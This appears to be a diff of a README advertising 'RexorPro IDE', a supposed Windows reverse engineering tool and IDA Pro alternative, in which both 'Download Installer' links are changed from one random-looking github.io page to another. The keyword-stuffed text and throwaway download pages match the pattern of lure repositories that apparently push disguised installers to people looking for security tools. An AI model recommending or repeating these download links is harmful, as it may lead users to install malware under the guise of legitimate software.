@@ -2,7 +2,7 @@
 
 RexorPro IDE is a comprehensive reverse engineering ide designed for Windows desktop users in 2026. It offers a suite of advanced tools for binary analysis, decompilation, and debugging, serving as a robust ida pro alternative for professionals and enthusiasts alike. With its intuitive interface and powerful features, RexorPro IDE streamlines complex reverse engineering tasks, making it an essential full re toolkit for modern security researchers.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Overview
 
@@ -68,7 +68,7 @@ Join the growing RexorPro community for tips, plugin development, and peer suppo
 
 ## Download
 
-[Get RexorPro IDE now from the official GitHub page](https://yellowtaxisave.github.io/download-page/)
+[Get RexorPro IDE now from the official GitHub page](https://capitals-707-bringing.github.io/download-page/)
 
 **Version**: 15.07 | **Last Updated**: 2026 | **Copyright © 2026 RexorPro Team**
 
